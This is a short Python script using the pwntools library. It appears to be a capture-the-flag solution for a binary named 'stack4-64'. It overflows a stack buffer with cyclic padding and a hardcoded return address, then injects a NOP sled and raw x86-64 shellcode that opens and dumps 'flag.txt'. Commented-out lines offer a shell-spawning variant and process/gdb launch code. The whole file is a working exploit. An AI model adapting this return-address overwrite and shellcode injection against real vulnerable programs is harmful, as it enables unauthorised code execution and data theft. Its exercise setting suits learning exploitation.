from pwn import *

shellcode  = 100*shellcraft.nop()
shellcode = asm(shellcode)
#shellcode += shellcraft.trap()
#shellcode += shellcraft.cat("flag.txt")
#shellcode += shellcraft.exit(0)
#shellcode += shellcraft.trap()
#shellcode += shellcraft.sh()
shellcode += b"\x6a\x01\xfe\x0c\x24\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"
payload  = cyclic(40)
payload += p64(0x7fffffffe450)
payload += shellcode

sys.stdout.buffer.write(payload)

#p = process("./stack4-64")

#gdb.attach(p,"""
#    break *main
#        """)
#p.sendline(payload)
#p.interactive()
